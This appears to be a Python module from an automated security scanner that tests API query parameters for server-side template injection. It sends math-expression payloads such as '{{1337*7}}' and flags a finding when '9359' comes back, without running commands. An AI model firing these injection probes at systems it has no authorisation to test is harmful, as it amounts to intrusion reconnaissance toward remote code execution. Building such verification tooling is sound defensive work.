import httpx

from backend.app.shasec.verifier import register
from backend.app.shasec.verifier._spec import fetch_spec, fill_path, get_endpoints, origin, query_params
from backend.app.shasec.verifier.base import ExploitContext, ExploitModule, ExploitResult
from backend.common.enums import FindingSeverity
from backend.common.log import log

# 1337 * 7 = 9359 — a product that won't appear in the payload itself, so seeing
# it in the response proves the expression was evaluated server-side.
_PAYLOADS = ('{{1337*7}}', '${1337*7}', '#{1337*7}', '<%= 1337*7 %>', '{{1337*7}}')
_EXPECTED = '9359'
_MAX_TARGETS = 25


class SstiModule(ExploitModule):
    """Server-side template / expression injection PoC.

    Injects a math expression and looks for the evaluated result. Pure proof —
    it never runs a system command; a confirmed hit means RCE is likely and
    warrants manual follow-up.
    """

    name = 'ssti'
    category = 'template-injection'
    handles = ('api', 'website')
    timeout = 150

    async def run(self, ctx: ExploitContext) -> list[ExploitResult]:
        results: list[ExploitResult] = []
        headers = {'Authorization': f'Bearer {ctx.auth_token}'} if ctx.auth_token else {}
        async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers=headers) as client:
            spec = await fetch_spec(client, origin(ctx.target_url))
            if not spec:
                return results

            org = origin(ctx.target_url)
            tested = 0
            for path, _method, op in get_endpoints(spec):
                params = query_params(op)
                if not params:
                    continue
                for param in params:
                    if tested >= _MAX_TARGETS:
                        return results
                    tested += 1
                    url = f'{org}{fill_path(path)}'
                    for payload in _PAYLOADS:
                        try:
                            r = await client.get(url, params={param: payload})
                        except httpx.HTTPError:
                            break
                        # Confirm: result present AND not just the raw payload echoed.
                        if _EXPECTED in r.text and _EXPECTED not in payload:
                            log.info(f'[exploit:ssti] scan {ctx.scan_id} CONFIRMED {url}?{param}={payload}')
                            results.append(
                                ExploitResult(
                                    category=self.category,
                                    title=f'Template/expression injection in `{param}` at {path}',
                                    severity=FindingSeverity.high.value,
                                    confirmed=True,
                                    impact='Server evaluated an injected expression (1337*7=9359) — likely RCE.',
                                    request=f'GET {url}?{param}={payload}',
                                    response=f'HTTP {r.status_code} — response contains {_EXPECTED}',
                                )
                            )
                            break
        return results


register(SstiModule())
